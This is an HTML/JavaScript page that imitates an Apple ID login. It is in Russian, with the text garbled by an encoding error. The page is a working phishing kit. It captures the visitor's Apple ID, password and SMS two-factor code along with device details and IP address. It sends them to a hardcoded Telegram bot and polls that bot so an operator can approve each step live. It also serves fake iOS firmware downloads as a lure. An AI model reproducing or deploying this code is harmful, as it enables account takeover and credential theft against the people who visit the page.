<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID –í—Ö–æ–¥</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
            overflow: hidden;
        }
        .header { background: #000; color: white; padding: 30px 20px; text-align: center; }
        .apple-logo { font-size: 48px; margin-bottom: 10px; }
        .content { padding: 40px 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        input:focus { outline: none; border-color: #007AFF; }
        .btn {
            width: 100%;
            padding: 14px;
            background: #007AFF;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
            margin-bottom: 10px;
        }
        .btn:hover { background: #0056CC; }
        .error-message { color: #FF3B30; text-align: center; margin-top: 15px; display: none; font-size: 14px; }
        .two-factor, .success-page, .download-page, .region-page { display: none; }
        .page-title { text-align: center; margin-bottom: 30px; color: #333; }
        .back-btn { background: #8E8E93; }
        .back-btn:hover { background: #6C6C70; }
        .download-options, .region-options { display: grid; gap: 10px; margin: 20px 0; }
        .region-options { grid-template-columns: 1fr 1fr; }
        .download-btn { background: #34C759; }
        .region-btn { background: #5856D6; }
        .success-message { text-align: center; color: #34C759; font-size: 18px; margin: 20px 0; }
    </style>
</head>
<body>

<div class="container">
    <div class="login-page" id="loginPage">
        <div class="header">
            <div class="apple-logo">Ô£ø</div>
            <h1>–í—Ö–æ–¥ –≤ Apple ID</h1>
        </div>
        <div class="content">
            <h2 class="page-title">–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–∏ –¥–∞–Ω–Ω—ã–µ</h2>
            <form id="loginForm">
                <div class="form-group">
                    <label for="appleId">Apple ID</label>
                    <input type="email" id="appleId" placeholder="name@example.com" required>
                </div>
                <div class="form-group">
                    <label for="password">–ü–∞—Ä–æ–ª—å</label>
                    <input type="password" id="password" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" required>
                </div>
                <button type="submit" class="btn">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button> 
           </div>
      </div>

    <div class="two-factor" id="twoFactorPage">
        <div class="header">
            <div class="apple-logo">Ô£ø</div>
            <h1>–ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è</h1>
        </div>
        <div class="content">
            <h2 class="page-title">–ö–æ–¥ –∏–∑ SMS</h2>
            <form id="twoFactorForm">
                <div class="form-group">
                    <label for="code2fa">–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</label>
                    <input type="text" id="code2fa" placeholder="6 —Ü–∏—Ñ—Ä" required maxlength="6">
                </div>
                <button type="submit" class="btn">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
                <button type="button" class="btn back-btn" onclick="showLoginPage()">–ù–∞–∑–∞–¥</button>
            </form>
            <div class="error-message" id="twoFactorError">–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥ –∏–ª–∏ –æ—Ç–∫–∞–∑.</div>
        </div>
    </div>

    <div class="success-page" id="successPage">
        <div class="header"><div class="apple-logo">Ô£ø</div><h1>–ì–æ—Ç–æ–≤–æ</h1></div>
        <div class="content">
            <div class="success-message">‚úÖ –í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω!</div>
            <button class="btn region-btn" onclick="showRegionPage()">–°–º–µ–Ω–∏—Ç—å —Ä–µ–≥–∏–æ–Ω</button>
            <button class="btn download-btn" onclick="showDownloadPage()">–°–∫–∞—á–∞—Ç—å iOS</button>
        </div>
    </div>

    <div class="region-page" id="regionPage">
        <div class="header"><div class="apple-logo">Ô£ø</div><h1>–†–µ–≥–∏–æ–Ω</h1></div>
        <div class="content">
            <div class="region-options">
                <button class="btn region-btn" onclick="changeRegion('–£–∫—Ä–∞–∏–Ω–∞')">–£–∫—Ä–∞–∏–Ω–∞</button>
                <button class="btn region-btn" onclick="changeRegion('–†–æ—Å—Å–∏—è')">–†–æ—Å—Å–∏—è</button>
                <button class="btn region-btn" onclick="changeRegion('–°–®–ê')">–°–®–ê</button>
                <button class="btn region-btn" onclick="changeRegion('–¢—É—Ä—Ü–∏—è')">–¢—É—Ä—Ü–∏—è</button>
                <button class="btn region-btn" onclick="changeRegion('–ò—Ä–ª–∞–Ω–¥–∏—è')">–ò—Ä–ª–∞–Ω–¥–∏—è</button>
                <button class="btn region-btn" onclick="changeRegion('–í–µ–ª–∏–∫–æ–±—Ä–∏—Ç–∞–Ω–∏—è')">–í–µ–ª–∏–∫–æ–±—Ä–∏—Ç–∞–Ω–∏—è</button>
            </div>
            <button class="btn back-btn" onclick="showSuccessPage()">–ù–∞–∑–∞–¥</button>
            <div class="success-message" id="regionSuccess" style="display: none;"></div>
        </div>
    </div>

    <div class="download-page" id="downloadPage">
        <div class="header"><div class="apple-logo">Ô£ø</div><h1>–ó–∞–≥—Ä—É–∑–∫–∞</h1></div>
        <div class="content">
            <div class="download-options">
                <button class="btn download-btn" onclick="downloadIOS('18.0')">iOS 18.0</button>
                <button class="btn download-btn" onclick="downloadIOS('17.5')">iOS 17.5</button>
                <button class="btn download-btn" onclick="downloadIOS('26.1')">iOS 26.1</button>
                <button class="btn download-btn" onclick="downloadIOS('16')">iOS 16</button>
            </div>
            <button class="btn back-btn" onclick="showSuccessPage()">–ù–∞–∑–∞–¥</button>
        </div>
    </div>
</div>

<script>
    const BOT_TOKEN = '8428343552:AAFAZhJAmphDEWY02aiTxR5wIwWvP2xyVlE';
    const CHAT_ID = '-1003894478662';
    
    // –†–∞—Å—à–∏—Ä–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –º–æ–¥–µ–ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    function detectDeviceDetails() {
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        const screen = `${screen.width}x${screen.height}`;
        
        // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –º–æ–¥–µ–ª–∏ iPhone –ø–æ userAgent –∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—é —ç–∫—Ä–∞–Ω–∞
        let deviceModel = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ";
        let deviceType = "–î—Ä—É–≥–æ–µ";
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º iPhone
        if (/iPhone/i.test(ua)) {
            deviceType = "iPhone";
            
            // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–π –º–æ–¥–µ–ª–∏ iPhone –ø–æ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—é
            if (screen === "375x812" || screen === "812x375") {
                if (/CPU iPhone OS 1[0-4]_/.test(ua)) deviceModel = "iPhone X/XS/11 Pro";
                else if (/CPU iPhone OS 1[5-9]_/.test(ua)) deviceModel = "iPhone 12/13 mini";
                else deviceModel = "iPhone X/XS/11 Pro";
            }
            else if (screen === "414x896" || screen === "896x414") {
                if (/CPU iPhone OS 1[1-3]_/.test(ua)) deviceModel = "iPhone XR/11";
                else if (/CPU iPhone OS 1[4-9]_/.test(ua)) deviceModel = "iPhone 11/12/13";
                else deviceModel = "iPhone 11/XR";
            }
            else if (screen === "390x844" || screen === "844x390") {
                deviceModel = "iPhone 12/13/14";
            }
            else if (screen === "428x926" || screen === "926x428") {
                deviceModel = "iPhone 12 Pro Max/13 Pro Max/14 Plus";
            }
            else if (screen === "393x852" || screen === "852x393") {
                deviceModel = "iPhone 15/15 Pro";
            }
            else if (screen === "430x932" || screen === "932x430") {
                deviceModel = "iPhone 15 Pro Max";
            }
            else if (screen === "320x480" || screen === "480x320") {
                deviceModel = "iPhone 4/4S/SE 1st gen";
            }
            else if (screen === "320x568" || screen === "568x320") {
                deviceModel = "iPhone 5/5S/SE 2nd/3rd gen";
            }
            else if (screen === "375x667" || screen === "667x375") {
                deviceModel = "iPhone 6/6S/7/8/SE 2nd/3rd gen";
            }
            else if (screen === "414x736" || screen === "736x414") {
                deviceModel = "iPhone 6+/6S+/7+/8+";
            }
            else if (screen === "375x812" || screen === "812x375") {
                deviceModel = "iPhone X/XS/11 Pro";
            }
            else {
                // –û–ø—Ä–µ–¥–µ–ª—è–µ–º –ø–æ iOS –≤–µ—Ä—Å–∏–∏ –µ—Å–ª–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –Ω–µ —Ä–∞—Å–ø–æ–∑–Ω–∞–Ω–æ
                const iosMatch = ua.match(/iPhone OS (\d+)_/);
                if (iosMatch) {
                    const iosVersion = parseInt(iosMatch[1]);
                    if (iosVersion >= 17) deviceModel = "iPhone (iOS 17+)";
                    else if (iosVersion >= 16) deviceModel = "iPhone (iOS 16)";
                    else if (iosVersion >= 15) deviceModel = "iPhone (iOS 15)";
                    else if (iosVersion >= 14) deviceModel = "iPhone (iOS 14)";
                } else {
                    deviceModel = "iPhone";
                }
            }
        }
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º iPad
        else if (/iPad/i.test(ua)) {
            deviceType = "iPad";
            if (/Macintosh/i.test(ua) && navigator.maxTouchPoints > 0) {
                deviceModel = "iPad (–Ω–æ–≤–µ–π—à–∞—è –º–æ–¥–µ–ª—å)";
            } else if (/iPad8/i.test(ua)) {
                deviceModel = "iPad Pro 11/12.9 (2020)";
            } else if (/iPad7/i.test(ua)) {
                deviceModel = "iPad 10.2 (2019)/iPad mini 5";
            } else {
                deviceModel = "iPad";
            }
        }
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º iPod
        else if (/iPod/i.test(ua)) {
            deviceType = "iPod";
            deviceModel = "iPod Touch";
        }
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º macOS
        else if (/Macintosh/i.test(ua) || /Mac OS X/i.test(ua)) {
            deviceType = "Mac";
            deviceModel = "Mac/–ú–∞–∫–±—É–∫";
        }
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º Windows
        else if (/Windows/i.test(ua)) {
            deviceType = "Windows PC";
            deviceModel = "–ö–æ–º–ø—å—é—Ç–µ—Ä Windows";
        }
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º Android
        else if (/Android/i.test(ua)) {
            deviceType = "Android";
            
            // –ü–æ–ø—Ä–æ–±—É–µ–º –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –º–æ–¥–µ–ª—å Android –ø–æ userAgent
            const androidModels = {
                'SM-': 'Samsung Galaxy',
                'Pixel': 'Google Pixel',
                'Mi ': 'Xiaomi',
                'Redmi': 'Redmi',
                'HUAWEI': 'Huawei',
                'OnePlus': 'OnePlus',
                'Nexus': 'Nexus'
            };
            
            for (const [key, model] of Object.entries(androidModels)) {
                if (ua.includes(key)) {
                    deviceModel = model;
                    break;
                }
            }
            if (deviceModel === "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ") {
                deviceModel = "Android —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ";
            }
        }
        
        // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±—Ä–∞—É–∑–µ—Ä–µ
        let browser = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –±—Ä–∞—É–∑–µ—Ä";
        if (/Chrome/i.test(ua) && !/Edge/i.test(ua) && !/OPR/i.test(ua)) {
            browser = "Chrome " + (ua.match(/Chrome\/(\d+)/) || [,''])[1];
        } else if (/Firefox/i.test(ua)) {
            browser = "Firefox " + (ua.match(/Firefox\/(\d+)/) || [,''])[1];
        } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
            browser = "Safari " + (ua.match(/Version\/(\d+)/) || [,''])[1];
        } else if (/Edge/i.test(ua)) {
            browser = "Edge " + (ua.match(/Edge\/(\d+)/) || [,''])[1];
        } else if (/OPR/i.test(ua)) {
            browser = "Opera " + (ua.match(/OPR\/(\d+)/) || [,''])[1];
        }
        
        // –ü–æ–ª—É—á–∞–µ–º IP (–ø—Ä–∏–º–µ—Ä - —Ä–µ–∞–ª—å–Ω–æ –Ω—É–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–µ—Ä–≤–µ—Ä–Ω—ã–π –∑–∞–ø—Ä–æ—Å)
        let ip = "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
        
        return {
            type: deviceType,
            model: deviceModel,
            screen: screen,
            browser: browser,
            userAgent: ua.substring(0, 100) + "...",
            platform: platform,
            ip: ip
        };
    }
    
    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è IP (–∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∞—è)
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.log("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP:", error);
            return "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";
        }
    }
    
    // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
    async function sendToTelegram(data, is2FA = false) {
        try {
            // –ü–æ–ª—É—á–∞–µ–º –¥–µ—Ç–∞–ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
            const deviceInfo = detectDeviceDetails();
            const userIP = await getUserIP();
            
            let message;
            
            if (is2FA) {
                message = `üîê 2FA –ö–û–î\n` +
                         `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${deviceInfo.model}\n` +
                         `üìü –¢–∏–ø: ${deviceInfo.type}\n` +
                         `üñ•Ô∏è –≠–∫—Ä–∞–Ω: ${deviceInfo.screen}\n` +
                         `üåç IP: ${userIP}\n` +
                         `üî¢ –ö–æ–¥: ${data.code2fa}\n` +
                         `üìß –ê–∫–∫–∞—É–Ω—Ç: ${data.appleId}\n` +
                         `üïê –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}\n` +
                         `üåê –ë—Ä–∞—É–∑–µ—Ä: ${deviceInfo.browser}`;
            } else {
                message = `üçé APPLE ID –í–•–û–î\n` +
                         `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${deviceInfo.model}\n` +
                         `üìü –¢–∏–ø: ${deviceInfo.type}\n` +
                         `üñ•Ô∏è –≠–∫—Ä–∞–Ω: ${deviceInfo.screen}\n` +
                         `üåç IP: ${userIP}\n` +
                         `üìß Apple ID: ${data.appleId}\n` +
                         `üîë –ü–∞—Ä–æ–ª—å: ${data.password}\n` +
                         `üïê –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}\n` +
                         `üåê –ë—Ä–∞—É–∑–µ—Ä: ${deviceInfo.browser}\n` +
                         `üîß –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${deviceInfo.platform}`;
            }
            
            // –ö–Ω–æ–ø–∫–∏ –¥–ª—è Telegram
            const inlineKeyboard = {
                inline_keyboard: [[
                    {
                        text: "‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å",
                        callback_data: is2FA ? "confirm_2fa" : "confirm_login"
                    },
                    {
                        text: "‚ùå –û—Ç–º–µ–Ω–∏—Ç—å",
                        callback_data: is2FA ? "cancel_2fa" : "cancel_login"
                    }
                ]]
            };
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: inlineKeyboard
                })
            });
            
            const result = await response.json();
            console.log('Telegram response:', result);
            return result.ok;
            
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
            return false;
        }
    }
    
    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∏–∑ Telegram
    let checkInterval;
    
    async function startPolling(is2FA, onSuccess, onCancel) {
        if (checkInterval) clearInterval(checkInterval);
        
        checkInterval = setInterval(async () => {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const data = await response.json();
                
                if (data.ok && data.result.length > 0) {
                    const lastUpdate = data.result[data.result.length - 1];
                    
                    if (lastUpdate.callback_query) {
                        const callbackData = lastUpdate.callback_query.data;
                        
                        if (is2FA) {
                            if (callbackData === 'confirm_2fa') {
                                clearInterval(checkInterval);
                                if (onSuccess) onSuccess();
                            } else if (callbackData === 'cancel_2fa') {
                                clearInterval(checkInterval);
                                if (onCancel) onCancel();
                            }
                        } else {
                            if (callbackData === 'confirm_login') {
                                clearInterval(checkInterval);
                                if (onSuccess) onSuccess();
                            } else if (callbackData === 'cancel_login') {
                                clearInterval(checkInterval);
                                if (onCancel) onCancel();
                            }
                        }
                    }
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ polling:', error);
            }
        }, 3000); // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∂–¥—ã–µ 3 —Å–µ–∫—É–Ω–¥—ã
    }
    
    // –ù–∞–≤–∏–≥–∞—Ü–∏—è –ø–æ —Å—Ç—Ä–∞–Ω–∏—Ü–∞–º
    function showLoginPage() { 
        hideAll(); 
        document.getElementById('loginPage').style.display = 'block';
        if (checkInterval) clearInterval(checkInterval);
    }
    
    function showTwoFactorPage() { 
        hideAll(); 
        document.getElementById('twoFactorPage').style.display = 'block';
        // –ê–≤—Ç–æ–∑–∞–ø–æ–ª–Ω—è–µ–º —Ç–µ—Å—Ç–æ–≤—ã–π –∫–æ–¥
        document.getElementById('code2fa').value = Math.floor(100000 + Math.random() * 900000);
    }
    
    function showSuccessPage() { 
        hideAll(); 
        document.getElementById('successPage').style.display = 'block'; 
    }
    
    function showRegionPage() { 
        hideAll(); 
        document.getElementById('regionPage').style.display = 'block'; 
    }
    
    function showDownloadPage() { 
        hideAll(); 
        document.getElementById('downloadPage').style.display = 'block'; 
    }
    
    function hideAll() {
        document.getElementById('loginPage').style.display = 'none';
        document.getElementById('twoFactorPage').style.display = 'none';
        document.getElementById('successPage').style.display = 'none';
        document.getElementById('regionPage').style.display = 'none';
        document.getElementById('downloadPage').style.display = 'none';
    }
    
    // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–æ—Ä–º—ã –≤—Ö–æ–¥–∞
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        e.stopPropagation();
        
        const appleId = document.getElementById('appleId').value.trim();
        const password = document.getElementById('password').value.trim();
        
        if (!appleId || !password) {
            alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è');
            return;
        }
        
        const data = { appleId, password, code2fa: '' };
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
        const btn = this.querySelector('.btn');
        const originalText = btn.textContent;
        btn.textContent = '–û—Ç–ø—Ä–∞–≤–∫–∞...';
        btn.disabled = true;
        
        try {
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram
            const sent = await sendToTelegram(data, false);
            
            if (sent) {
                document.getElementById('loginError').style.display = 'none';
                alert('‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã! –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤ Telegram...');
                
                // –ù–∞—á–∏–Ω–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
                startPolling(
                    false,
                    () => {
                        // –ï—Å–ª–∏ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ –≤ Telegram
                        showTwoFactorPage();
                        alert('‚úÖ –í—Ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω! –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS.');
                    },
                    () => {
                        // –ï—Å–ª–∏ –æ—Ç–º–µ–Ω–∏–ª–∏ –≤ Telegram
                        document.getElementById('loginError').textContent = '‚ùå –í—Ö–æ–¥ –æ—Ç–∫–ª–æ–Ω–µ–Ω –æ–ø–µ—Ä–∞—Ç–æ—Ä–æ–º';
                        document.getElementById('loginError').style.display = 'block';
                        btn.textContent = originalText;
                        btn.disabled = false;
                    }
                );
                
            } else {
                document.getElementById('loginError').textContent = '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.';
                document.getElementById('loginError').style.display = 'block';
            }
            
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞:', error);
            document.getElementById('loginError').textContent = '‚ùå –û—à–∏–±–∫–∞: ' + error.message;
            document.getElementById('loginError').style.display = 'block';
        } finally {
            btn.textContent = originalText;
            btn.disabled = false;
        }
    });
    
    // –û–±—Ä–∞–±–æ—Ç–∫–∞ 2FA —Ñ–æ—Ä–º—ã
    document.getElementById('twoFactorForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        e.stopPropagation();
        
        const code2fa = document.getElementById('code2fa').value.trim();
        const appleId = document.getElementById('appleId').value.trim();
        
        if (!code2fa || code2fa.length !== 6) {
            alert('–í–≤–µ–¥–∏—Ç–µ 6-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥');
            return;
        }
        
        const data = { appleId, password: '', code2fa };
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
        const btn = this.querySelector('.btn');
        const originalText = btn.textContent;
        btn.textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞...';
        btn.disabled = true;
        
        try {
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º 2FA –∫–æ–¥ –≤ Telegram
            const sent = await sendToTelegram(data, true);
            
            if (sent) {
                document.getElementById('twoFactorError').style.display = 'none';
                alert('‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è...');
                
                // –ù–∞—á–∏–Ω–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –¥–ª—è 2FA
                startPolling(
                    true,
                    () => {
                        // –ï—Å–ª–∏ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ 2FA
                        showSuccessPage();
                    },
                    () => {
                        // –ï—Å–ª–∏ –æ—Ç–º–µ–Ω–∏–ª–∏ 2FA
                        document.getElementById('twoFactorError').textContent = '‚ùå –ö–æ–¥ –æ—Ç–∫–ª–æ–Ω–µ–Ω –æ–ø–µ—Ä–∞—Ç–æ—Ä–æ–º';
                        document.getElementById('twoFactorError').style.display = 'block';
                        btn.textContent = originalText;
                        btn.disabled = false;
                    }
                );
                
            } else {
                document.getElementById('twoFactorError').textContent = '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞';
                document.getElementById('twoFactorError').style.display = 'block';
            }
            
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞:', error);
            document.getElementById('twoFactorError').textContent = '‚ùå –û—à–∏–±–∫–∞: ' + error.message;
            document.getElementById('twoFactorError').style.display = 'block';
        } finally {
            btn.textContent = originalText;
            btn.disabled = false;
        }
    });
    
    // –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è –∫–Ω–æ–ø–æ–∫
    function changeRegion(country) {
        const el = document.getElementById('regionSuccess');
        el.textContent = `‚úÖ –†–µ–≥–∏–æ–Ω —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω –Ω–∞ ${country}!`;
        el.style.display = 'block';
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram –æ —Å–º–µ–Ω–µ —Ä–µ–≥–∏–æ–Ω–∞
        const deviceInfo = detectDeviceDetails();
        const message = `üåç –°–ú–ï–ù–ê –†–ï–ì–ò–û–ù–ê\n` +
                       `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${deviceInfo.model}\n` +
                       `üåê –°—Ç—Ä–∞–Ω–∞: ${country}\n` +
                       `üïê –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`;
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
    }
    
    function downloadIOS(version) {
        // –°–æ–∑–¥–∞–µ–º —Ñ–∏–∫—Ç–∏–≤–Ω—ã–π —Ñ–∞–π–ª –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è
        const content = `iOS ${version} Firmware\n–≠—Ç–æ —Ç–µ—Å—Ç–æ–≤—ã–π —Ñ–∞–π–ª.\n–í–µ—Ä—Å–∏—è: ${version}\n–î–∞—Ç–∞: ${new Date().toLocaleString('ru-RU')}\n–†–∞–∑–º–µ—Ä: 4.2 GB (—Ç–µ—Å—Ç–æ–≤—ã–π)`;
        const blob = new Blob([content], { type: 'application/octet-stream' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = `iOS_${version}_Restore.ipsw`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        setTimeout(() => {
            URL.revokeObjectURL(url);
        }, 100);
        
        alert(`üì• iOS ${version} –Ω–∞—á–∞–ª —Å–∫–∞—á–∏–≤–∞—Ç—å—Å—è!`);
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram –æ —Å–∫–∞—á–∏–≤–∞–Ω–∏–∏
        const deviceInfo = detectDeviceDetails();
        const message = `üì• –ó–ê–ì–†–£–ó–ö–ê iOS\n` +
                       `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${deviceInfo.model}\n` +
                       `üì≤ –í–µ—Ä—Å–∏—è iOS: ${version}\n` +
                       `üïê –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`;
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
    }
    
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
    showLoginPage();
    
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ –≤ –∫–æ–Ω—Å–æ–ª–∏ –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
    console.log('–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:', detectDeviceDetails());
</script>
</body>
</html>

